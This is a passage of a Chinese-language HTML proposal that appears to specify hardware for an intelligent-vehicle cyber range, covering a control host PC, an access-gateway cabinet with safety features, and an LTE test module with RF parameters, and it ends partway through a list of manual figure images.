"https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9470c17b64f73ad88fcfece0d1a96da2.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_273"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9d5c73df46c77dd73210a0fd9a918a50.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_274"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/3f45c162f92c1ef5e1a23cedf6a72207.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_275"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2bb8372668a9ebe98e07b2edd91f9c54.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_276"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/14ee25e0c7cb538a266f82a4901f9b76.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_277"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9cb3a6981047d620569dbecbdd5b2a9f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_278"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1965f8161257d2133ec72cfaec101037.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_279"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/95500022ccd1c8d2fee8e54fa5a8708f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_280"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d8a9fe877f7b40f83207d53004f21f4b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_281"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/49cebaa0b1dde83952e5c05eea832e24.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_282"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8f3de6daf03226894e8119655529ed89.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_283"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/75d3502dc62265442ae2ac89b5fe063b.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_284"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0eb99d3bab2a52095e6ea1b2c95e29ef.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_285"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/8e24ed508352a431a9a5a35d591c38bb.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_286"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0a7fd6d0f31da76bdad6e779f1f002b3.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_287"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f2473889dfc9393975be6b59b1426079.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_288"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f30a10a5881cf62f2b05231abc48585d.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_289"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6033d9fdee75f63275aea37e07ee76af.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_290"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/1f4e92882f5dd04069329300cd9d7362.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_291"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/bd6d17bd178c501801f4025298b8ee19.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_292"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/2f264f6a8f3fe4cad4397db7c051cd18.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_293"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9c8e8d402eb6bd09395d19040ee8cbb0.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_294"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7f625687a50eda8865b31f95c342cedd.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_295"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4d0251dfa5756159ad9418a76c9157e5.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_296"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/62a5f99c87e3d4196cc26be7b07f442f.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_297"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/6cb53b3eb8c2ade7be5749e0c3e3840c.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_298"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/898d6f2577c21c696bc3b506eeaed9a3.jpeg" alt="IT-M3906B-80-120 User Manual-CN 标注_299"></p><h3 id="程控上位机"><a href="#程控上位机" class="headerlink" title="程控上位机"></a>程控上位机</h3><h4 id="功能实施方案-12"><a href="#功能实施方案-12" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>程控上位机采用了主流工业母版，它支持Intel LGA 1700插槽，这一特性使得上位机能够兼容最新的Intel处理器。这种设计保证了上位机在处理能力上的前瞻性和升级的灵活性，允许用户根据自己的需求选择合适的CPU，从而确保了系统的高性能和长期的适用性。无论是在需要大量数据处理的工业自动化应用，还是在对计算速度有严格要求的数据分析任务中，这种支持最新插槽的母版都能提供稳定而强大的基础。</li><li>为了确保的程控上位机在各种工业应用中都能提供卓越的性能，精心选择了CPU配置。具体来说，的上位机选用了性能强劲的Intel第13代i7处理器的CPU。这样的处理器能够轻松应对复杂的数据处理任务，保证了系统在运行高负载工业应用程序时的流畅和稳定。无论是进行图像处理、数据分析还是管理复杂的控制系统，这些处理器都能提供必要的计算力，确保了程控上位机的高效率和可靠性。</li><li>的程控上位机在设计上充分考虑了扩展性，因此它具备3个PCIe（Peripheral Component Interconnect Express）插槽。这一特点使得用户可以根据需要添加多种扩展卡，如额外的图形卡、网络卡或专业的工业控制卡，从而提高系统的多功能性和适应不同应用场景的能力。这种灵活的扩展性，的上位机能够随着用户需求的变化而升级，确保了长期的投资保值。无论是现在还是将来，用户都能通过增加PCIe卡来不断增强其系统的功能。</li><li>在设计的程控上位机时，充分考虑到了现代工业环境中对于多样化连接选项的需求。因此，确保了设备配备了5个USB接口，这样的配置为用户提供了丰富的外设连接能力。无论是用于数据传输、系统维护更新，还是连接键盘、鼠标和其他必要的外部设备，这些USB接口都能够提供足够的灵活性和便捷性。这样的设计不仅满足了当前的需求，同时也为未来可能的扩展留出了空间。</li><li>为了满足现代工业自动化对网络通讯的高标准要求，的程控上位机被设计为具备2个千兆网口。这些高速网口使得上位机能够同时连接多个网络通道，保障了数据传输的高效率和系统的通讯可靠性。无论是用于远程监控、数据采集还是实时控制指令的传输，双千兆网口的配置都能够提供强大的数据处理能力和稳定的网络性能，确保了在复杂网络环境下的无缝运行。</li><li>在设计的程控上位机时，细致考虑了工业现场对于传统串行通讯的依赖，因此确保它具备了RS232和RS485串口。这些串口的加入，为设备提供了与各种工业设备，如传感器、PLC等进行数据通信的能力，特别是在需要远距离通讯和高抗干扰性能的工业环境中。RS232串口在点对点通讯中表现出色，而RS485串口则支持多点通讯，极大地增强了上位机在复杂工业控制系统中的互联互通能力。</li><li>为了确保程控上位机能够流畅地处理大量数据并运行复杂的工业应用程序，配备了32G的DDR4内存。这样的内存配置不仅提供了快速的数据读写速度，而且还保证了在多任务处理和大规模数据处理时的高效性能。高容量的DDR4内存可使上位机能够更好地应对未来工业应用程序对内存的增长需求，确保了系统的长期稳定运行和可扩展性。</li><li>在构建的程控上位机时，充分考虑到了工业环境中对数据存储速度和可靠性的严格要求。因此，确保了上位机配备1T的SSD硬盘，这不仅为用户提供了大容量的存储空间，以满足庞大数据集的存储需求，还因SSD的固态特性，相较于传统机械硬盘，大幅提高了数据读写速度，减少了故障率，增强了抗震动和抗冲击能力。这样的硬盘配置确保了在高速数据处理和长期稳定运行方面的优越性能，满足了工业控制系统中对高效率和高可靠性的双重要求。</li><li>在设计的程控上位机时，特别选择了主流的4U工业机箱，这样的机箱不仅在工业环境中广泛应用，而且具备了可上架的设计。4U的尺寸为上位机提供了足够的内部空间，以便容纳所需的高性能硬件组件，并且确保了良好的散热性能。同时，可上架的特性能使这款上位机可以方便地安装在机架中，与其他网络设备或服务器一同组成整齐、高效的工作站。这种设计不仅节省了空间，而且便于维护和升级，满足了工业应用对于稳定性和可靠性的高标准。</li></ol><p>指标参数信息如下：</p><ol><li>主流工业母版，支持Intel LGA 1700插槽；</li><li>Intel 13代 i7处理器；</li><li>提供3个PCIe插槽；</li><li>提供5个USB接口；</li><li>提供2个千兆网口；</li><li>具备RS232、RS485串口；</li><li>配备32G DDR4 内存；</li><li>配备1T SSD硬盘</li><li>4U工业机箱，可上架。</li></ol><h4 id="技术实现内容-10"><a href="#技术实现内容-10" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>程控上位机是一种通过计算机软件来控制和监控设备的系统。它通常与设备进行通信，通过计算机的界面和功能，实现对设备的远程控制、参数设置、数据采集和分析等操作。</p><p>程控上位机的功能通常包括以下几个方面：</p><p>1. 远程控制：使用程控上位机可以通过计算机软件来远程控制设备的开关、调节参数等操作，方便用户对设备进行控制。</p><p>2. 参数设置：通过程控上位机可以方便地设置设备的工作参数，如电压、电流、频率等，以满足不同的应用需求。</p><p>3. 数据采集与分析：程控上位机可以实时采集设备产生的数据，并提供数据分析功能，如波形显示、数据统计等，方便用户对实验数据进行分析和处理。</p><p>4. 实验控制与自动化：程控上位机可以通过编程和脚本等方式实现实验的自动化控制，例如自动调节设备参数、记录数据、生成报告等。</p><p>5. 远程监控与故障诊断：程控上位机可以实时监控设备的运行状态，并提供故障诊断功能，帮助用户及时发现和解决设备故障。</p><p>总之，程控上位机通过计算机软件的界面和功能，提供了方便、灵活、智能化的设备控制和监控手段，广泛应用于实验室、工业自动化、生产线等领域。</p><h1 id="智能汽车网络靶场零部件接入网关"><a href="#智能汽车网络靶场零部件接入网关" class="headerlink" title="智能汽车网络靶场零部件接入网关"></a>智能汽车网络靶场零部件接入网关</h1><h2 id="技术路线-2"><a href="#技术路线-2" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="零部件接入网关"><a href="#零部件接入网关" class="headerlink" title="零部件接入网关"></a>零部件接入网关</h3><h4 id="接入网关柜体"><a href="#接入网关柜体" class="headerlink" title="接入网关柜体"></a>接入网关柜体</h4><h5 id="功能实施方案-13"><a href="#功能实施方案-13" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>为了保证设备的安全性，每个机柜都配备了急停开关。任何一个急停开关都可以控制整个系统断电。这意味着，如果出现任何紧急情况，只需按下一个急停开关，就能立即切断整个系统的电源，从而避免设备受到损坏或人员受到伤害；</li><li>高压系统安全规范是为了确保混动系统后续车型的高压系统安全而设立的。这套设备不仅具备高压系统安全检测及紧急情况处置装置，还具备声光报警功能，可以及时提醒人员注意。此外，该设备还具备检测绝缘阻值的功能，可以监测绝缘性能的变化情况。为了进一步保证安全，只有在柜门关闭后才允许系统工作，一旦绝缘性能下降或柜门打开，设备会立即切断供电，以避免潜在的危险。通过遵循这些参数要求，高压系统的安全得到了有效保障；</li><li>机柜具备有效的电磁屏蔽措施，机柜外壳采用高度导电性的金属材料，这种材料能够吸收和屏蔽大部分电磁辐射。可以有效的降低其对操作人员的辐射影响；</li><li>为了确保操作人员的安全，机柜具备高效可靠的漏电检测系统。这个系统能够实时监测机柜的电流流向，并及时检测和报警漏电情况。一旦发现漏电问题，系统会立即切断电源供应，以避免潜在的人身伤害风险。通过这些参数要求的实施，机柜能够有效消除漏电隐患，确保操作人员在使用过程中不会受到漏电导致的伤害；</li><li>机柜表面根据场地和实际要求，将为其定制标注有明显的图案或标志；</li><li>配备电源、车载以太网、CAN和USB调试接口，以方便与台架进行连接组网。这些接口的存在是为了提供便捷的连接方式，使机柜能够与台架或其他设备进行数据传输和通信。首先，电源接口用于向机柜提供电力供应，确保其正常运行。其次，车载以太网接口可以实现高速网络连接，使机柜可以与其他设备进行数据交换和共享。此外，CAN接口在汽车领域具有重要作用，可以实现车辆系统之间的数据传输和通信。最后，USB调试接口则为机柜提供了方便的调试和配置通道，使操作人员能够快速进行设置和调整。通过这些参数要求的实施，机柜能够轻松地与台架进行连接组网，实现数据互通和系统协作。因此，在机柜的设计和制造过程中，必须充分考虑这些接口的设置和布局，以确保其功能齐全、稳定可靠，并能满足与台架连接组网的需求；</li><li>为了提供便利的人机交互体验和优质的显示效果，该部分配备了KVM集成鼠标与键盘，屏幕尺寸为18英寸，屏幕分辨率为1920*1080，亮度达到280nits，对比度为600:1。首先，配备KVM集成鼠标与键盘的设计让用户可以直接在机柜上操作，无需额外的键鼠设备，方便快捷。其次，18英寸的屏幕尺寸适中，既不会占据过多的空间，又能够展示足够的信息内容。而1920*1080的屏幕分辨率保证了清晰细腻的图像显示，使得用户能够更加准确地观察和操作机柜内部的设备和数据。亮度达到280nits的设计保证了屏幕在不同环境下的可视性，即使在明亮的场所也能够清晰可见。而对比度为600:1则提供了良好的黑白对比度，使得图像更加鲜明生动。通过这些参数要求的实施，机柜能够提供出色的人机交互体验和高品质的显示效果，满足用户对于操作和观察的需求。因此，在机柜的设计和制造过程中，必须充分考虑这些参数要求，并确保它们的性能和稳定性符合相关标准和规范。</li></ol><h5 id="技术实现内容-11"><a href="#技术实现内容-11" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h6><p>接入网关柜体（Access Gateway Cabinet）是指用于接入网络设备的柜体或机柜，用于安装和管理与网络接入相关的设备和设施。</p><p>接入网关柜体通常包含以下特点和功能：</p><p>1. 设备安装空间：接入网关柜体提供足够的空间，用于安装和组织接入网络设备，如交换机、路由器、光纤分配盒等。</p><p>2. 网络管理：接入网关柜体提供有组织的布局和管理，方便对接入设备进行标识、连接和维护。</p><p>3. 电源和线缆管理：接入网关柜体通常配备电源插座和线缆管理装置，以确保设备的供电和线缆的整齐布置。</p><p>4. 空调和散热：为了保持接入设备的正常运行，接入网关柜体可能配备空调系统或散热装置，以控制温度和保持设备的稳定性。</p><p>5. 安全和防护：接入网关柜体通常具备防护功能，如锁定机制、防尘、防潮等，以确保设备的安全和可靠性。</p><p>6. 管理和监控：一些高级接入网关柜体配备远程管理和监控系统，提供远程访问、告警和故障排查等功能，以方便对接入设备进行管理和维护。</p><p>接入网关柜体配置多个急停开关，当遇到紧急情况，任何一个急停开关可控制整个系统断电。通过使用接入网关柜体，可以有效地管理和组织接入网络设备，提供良好的设备安装环境和管理手段，以确保网络接入的稳定性和可靠性。</p><p>将确保混动车型的高压系统在工作过程中能够保持安全可靠，减少潜在的风险和安全隐患。同时，驾驶员和维修人员也需要严格按照相应的操作规程进行操作，以确保高压系统的安全使用。</p><p>机柜通常采用金属材料制成外壳，具备电磁屏蔽措施，以减少对操作人员的辐射伤害，金属能够有效地吸收和屏蔽电磁辐射，机柜的门和接口通常采用导电材料密封，以确保机柜内外的电磁波无法穿透，在机柜内部使用磁屏蔽材料，将磁场局限在一定范围内，减少对操作人员的影响；机柜需要进行良好的接地处理，确保机柜内外的电位一致，机柜应该经过电磁屏蔽测试，确保其具备足够的电磁屏蔽效果。</p><p>具有漏电检测措施，不存在机柜漏电而导致人身伤害的情况。机柜内的电路通常会连接到一个漏电保护开关上，这个开关能够监测电流的变化，一旦出现漏电情况，就会自动切断电源，以保护人员的安全。机柜内的设备通常会通过地线连接到接地系统，这样一来，一旦发生漏电，电流会通过地线流回地面，而不是通过人体，从而降低了人身伤害的风险。</p><p>后续能够接入混动车型，为保证混动车型的高压系统安全，提供的整套设备满足高压系统安全检测功能，同时提供了紧急情况处置装置，装置具备声光报警功能，检测绝缘阻值的功能，柜门关闭后才允许系统工作，并在绝缘性能下降或柜门打开时切断设备供电），以保证高压系统的安全。</p><p>机柜最上的2U位置布置具备标识的设备名牌。</p><p>接入网关机柜配置电源、车载以太网、CAN、USB调试接口，方便与台架进行连接组网。</p><p>接入网关机柜配置KVM集成鼠标与键盘，屏幕尺寸18英寸，屏幕分辨率1920*1080，亮度280nits，对比度600:1。</p><h4 id="LTE接入模块"><a href="#LTE接入模块" class="headerlink" title="LTE接入模块"></a>LTE接入模块</h4><h5 id="功能实施方案-14"><a href="#功能实施方案-14" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>满足不同网络制式和通信技术的测试需求，仪表支持2G、3G、LTE、WLAN、蓝牙的信令和非信令测试功能，以确保具备广泛的兼容性和测试能力。从而提供全面的性能分析和优化指导；详见产品手册中图2-1、图2-2</li><li>LTE支持TDD（时分双工）和FDD（频分双工）两种双工方式。这些双工方式的支持可以满足大部分无线网络通信环境，以确保LTE接入模块在各种场景下都能够实现高效的双向通信；详见产品手册中图2-3</li><li>满足能够同时模拟两个小区（Cell）的信号，其中可以是2G与3G的组合、2G与LTE的组合或者3G与LTE的组合。支持同时进行2G、3G和LTE网络的仿真和切换测试，以满足多网络环境下的需求。这种仿真测试的目的是为了验证LTE接入模块在不同网络类型和制式之间的切换性能，并且确保平稳且无缝地进行通信；</li><li>支持3GPP 36.521射频测试的全部内容。3GPP 36.521是一项重要的标准，规定了LTE系统中射频特性的测试方法和要求。LTE接入模块符合这些测试要求，该设备通过加载软件选件以确保其在射频性能方面的良好表现；详见产品手册中图2-4</li><li>内置应用测试服务器，支持IP层数据业务测试，包括2G、3G、LTE和WLAN等不同网络制式。同时，这个应用测试服务器还具备连接外部实际网络的能力，以便进行真实场景下的应用测试。在这些测试中，LTE接入模块需要支持终端与公网服务器建立真实业务连接，以模拟实际的用户使用场景；详见产品手册中图2-5</li><li>支持多种WLAN标准，包括802.11abgn、ac和ax。这些标准涵盖了不同的频段和传输速率，以满足不同应用场景下的需求。此外，还支持蓝牙技术，从蓝牙4.2到最新的蓝牙5.1版本；详见产品手册中图2-6、图2-7</li><li>在进行LTE-V测试时需要满足相应的技术规范，支持LTE-V测试，并符合3GPP 36.211、36.212和36.213规范的要求。以保证其性能和兼容性；详见产品手册中图2-8</li><li>在LTE接入模块的参数要求中，主机选件配置包含一系列功能的选件名称，以满足不同测试需求。这些功能包括GSM测试、WCDMA测试、LTE测试、LTE R14 C-V2X PC5测量、蓝牙测试、WLAN测试（包括802.11abgn、ac、ax、p）以及Ecall测试。通过这些选件，LTE接入模块可以实现对不同网络和设备的测试和评估，确保其在各种情况下的兼容性、性能和稳定性；选件信息见“方案”</li><li>为满足不同场景下的信道衰落仿真需求，设备支持TS45.005 C.3和TS25.101 B.2.x的衰落模型加载，通过加载不同模型，完成对应的需求测试；详见产品手册中图2-9、图2-10</li><li>MIMO&amp;CA方面的能力，具备LTE 2CC 4*4MIMO和4CC SISO的能力，以支持多天线技术和载波聚合技术，提供更高的数据传输速率和网络容量；详见产品手册中图2-11</li></ol><h5 id="性能实施方案-2"><a href="#性能实施方案-2" class="headerlink" title="性能实施方案"></a>性能实施方案</h5><ol><li><p>支持广泛的频率范围，从70MHz到6GHz，以满足不同应用场景和频段的需求。此外，支持高达160 MHz的信号带宽，以确保在高速数据传输和大容量通信的情况下，能够提供稳定和高效的连接。类似地，分析带宽也达到160 MHz，以保证对信号进行准确、全面的分析和评估。通过支持这样宽广的频率范围和大带宽需求，适应不同的网络环境和应用场景，提供出色的性能和可靠性。因此，确保具备频率范围广、信号带宽和分析带宽充足的能力，对于实现高质量的通信和数据传输至关重要；详见产品手册中图2-12、图2-13</p></li><li><p>具备4个射频通道，以支持同时处理多个信号和通信连接。这样的射频通道数量可以实现更高的信号处理能力，允许同时处理多个信号源，并实现更强大的信号传输和数据处理能力。这对于满足多用户同时连接、高密度数据传输以及复杂网络环境下的稳定性非常重要；详见产品手册中图2-14</p></li><li><p>频率设置精度、发射机幅度精度和接收机幅度精度是需要关注的重要指标。首先，频率设置精度达到了0.1Hz的要求，以确保LTE接入模块能够准确地设置和定位频率，从而避免信号干扰和频率误差的问题。其次，在发射机幅度精度方面，保持±0.6 dB的精度，以确保发射功率能够稳定在预设的范围内，避免过强或过弱的信号传输，保证通信质量和干扰控制。最后，在接收机幅度精度方面，精度为±0.5 dB，这是为了确保准确地接收和解码信号，提供可靠的数据传输和通信连接。通过满足这些测试要求，提供高精度和稳定的频率设置、发射功率控制和接收信号处理能力，从而保证通信的准确性和可靠性；详见产品手册中图2-15</p></li><li><p>CW输出功率范围覆盖在100 MHz~3.3 GHz之间，以满足不同频段和应用环境下的需求。通过提供这样的CW输出功率范围，可以实现更广泛的信号覆盖和传输范围，并提供更强大的信号输出能力；详见产品手册中图2-16</p></li><li><p>双工端口覆盖-130 ~ -5 dBm的范围，以确保在双工通信过程中能够实现合适的功率传输。通过提供这样的双工端口范围，可以应对不同信号强度和距离的通信需求，从而保证通信的稳定性和可靠性；详见产品手册中图2-17</p></li><li><p>单输出端口覆盖-130 ~ +3 dBm的范围，以确保在信号输出过程中能够实现合适的功率传输。通过提供这样广泛的单输出端口范围，可以适应不同信号强度和距离的通信需求，从而保证通信的稳定性和可靠性；详见产品手册中图2-17</p></li><li><p>相位噪声在频偏1 MHz时小于-117 dBc（1 Hz）。这就在频率偏移为1 MHz的情况下，相对于1 Hz带宽的信号，其相位噪声应保持在-117 dBc的水平；详见产品手册中图2-18</p><p>分辨率带宽RBW范围为100 Hz~10 MHz，该模块可以适用于不同的频谱分析应用场景，适合进行更精准、高效的频谱分析；详见产品手册中图2-19</p></li><li><p>视频滤波器带宽VBW范围为10 Hz~10 MHz，该模块具备广泛的频率选择能力，可以适应不同类型的视频信号处理需求，以获得更清晰、准确的图像；详见产品手册中图2-19</p></li><li><p>高于97 dB的动态范围，在接收到非常微弱的信号时仍保持高度的灵敏度，同时在面对非常强的信号时也能够不产生过载或失真，确保通信的可靠性和稳定性；详见产品手册中图2-20</p></li><li><p>进行功率测量时，其测量的性能指标覆盖了从-74（dBm）到+34（dBm）范围的连续波，这一范围适用于连续波形的信号。此外，当涉及到峰包络功率（Peak Envelope Power，简称PEP）的测量时，该模块能够处理的最大功率可达42（dBm）；详见产品手册中图2-21</p></li><li><p>220V AC作为一个常见的电力供应规格，不仅确保了模块可以在广泛的地理区域内无缝接入电网，还意味着模块可利用标准的电源插座进行供电，从而简化了安装和维护过程。详见产品手册中图2-22</p></li></ol><h5 id="技术实现内容-12"><a href="#技术实现内容-12" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="方案-1"><a href="#方案-1" class="headerlink" title="方案"></a>方案</h6><p>LTE接入模块选用罗德与施瓦茨（中国）科技有限公司产品，LTE接入模块是一种用于手机、平板电脑、移动路由器等无线设备连接LTE网络的模块。它是一种嵌入式模块，由芯片、射频前端、天线、软件等组成。</p><p>LTE接入模块具有以下特点和功能：</p><p>1. 高速数据传输：LTE接入模块支持LTE网络的高速数据传输，可以达到数百兆位每秒的数据传输速度，提供更快的上网体验。并能完成2G、3G、LTE、WLAN、蓝牙的信令和非信令测试。</p><p>2. 多频段支持：LTE接入模块支持多种LTE频段，支持TDD和FDD两种双工方式，可进行2G、3G、LTE任意两小区同时仿真和切换测试，并能完成3GPP 36.521射频测试全部内容，以适应不同地区和运营商的网络需求。</p><p>3. 多模式支持：LTE接入模块通常支持多种网络制式，如LTE、GSM、UMTS等，以确保设备在不同网络环境下的通信能力。</p><p>4. 多天线支持：LTE接入模块通常支持多个天线接口，具备MIMO&amp;CA能力，包括LTE 2CC 4*4MIMO，4CC SISO，以提高信号接收和发送的质量和稳定性。</p><p>5. 小型化和低功耗：LTE接入模块通常采用小型化设计和低功耗技术，以适应移动设备的特点，延长设备的电池寿命。</p><p>6. 兼容性强：LTE接入模块通常具有良好的兼容性，可以与各种操作系统和开发平台配合使用，方便开发和应用。</p><p>LTE接入模块中的LTE-V测试并符合3GPP 36.211，36.212，36.213规范要求，内置了应用测试服务器，可满足IP层数据业务测试（包括2G、3G、LTE和WLAN），并可以接入外部实际网络进行应用测试，进行终端与公网服务器建立真实业务连接。</p><p>通过使用LTE接入模块，可以实现无线设备与LTE网络的连接，提供高速数据传输和多模式支持，该模块可实现TS45.005 C.3和TS25.101 B.2.x衰落模型加载，为设备的上网和通信提供更加稳定和可靠的接入方式。</p><p>CMW500是一款通用无线通信测试仪器，主机选件配置包含GSM测试、WCDMA测试、LTE测试、LTE R14 C-V2X PC5测量、蓝牙测试、WLAN测试（包括802.11abgn，ac，ax，p）、Ecall测试功能的相关选件名称。</p><p>LTE接入模块详细参数如下：</p><p>频率范围： 70MHz~6GHz；信号带宽：160 MHz; 分析带宽：160 MHz；</p><p>射频通道数：4个；</p><p>频率设置精度：0.1Hz;发射机幅度精度：±0.6 dB；</p><p>接收机幅度精度：±0.5 dB；</p><p>CW输出功率范围（100 MHz~3.3 GHz）；</p><p>双工端口：覆盖-130 ~ -5 dBm；</p><p>单输出端口：覆盖-130 ~ +3 dBm；</p><p>相位噪声:频偏1 MHz&lt;–117 dBc（1 Hz）；</p><p>分辨率带宽RBW: 100 Hz~10 MHz；</p><p>视频滤波器带宽VBW: 10 Hz~10 MHz；</p><p>动态范围&gt;97 dB；</p><p>功率测量范围:覆盖-74 dBm ~ +34 dBm（连续波），PEP可达42 dBm；</p><p>供电电压：220V AC。</p><p>**<br>**</p><h6 id="产品手册"><a href="#产品手册" class="headerlink" title="产品手册"></a>产品手册</h6><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f5a28fe9c0e3dd854f1fdd0c7d805258.png"></p><p>图2-1</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/0025b6a8f63b3c8e1eff01a7d1e81de3.png" alt="IMG_256"></p><p>图2-2</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/406446288bd44d4235d2c450064e7432.png" alt="IMG_256"></p><p>图2-3</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/69aa027c95516cbfcaa94976caeea29c.png" alt="IMG_256"></p><p>图2-4</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d88a1fddcf74b6821fe2bf8ebc876018.png" alt="IMG_256"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/4365b5e086d331c7c333e762050b0237.png" alt="IMG_256"></p><p>图2-5</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/7b274ded18cc2990ff641d564bdefa8c.png" alt="IMG_256"></p><p>图2-6</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/420ba0a2485d82c4c2c16af7a3f2acf9.png" alt="IMG_256"></p><p>图2-7</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/25570578dd93e5cca6f3e7730ed54abc.png" alt="IMG_256"></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/eadb3ca0ee76f2124abd4838d179bb55.png" alt="IMG_256"></p><p>图2-8</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" 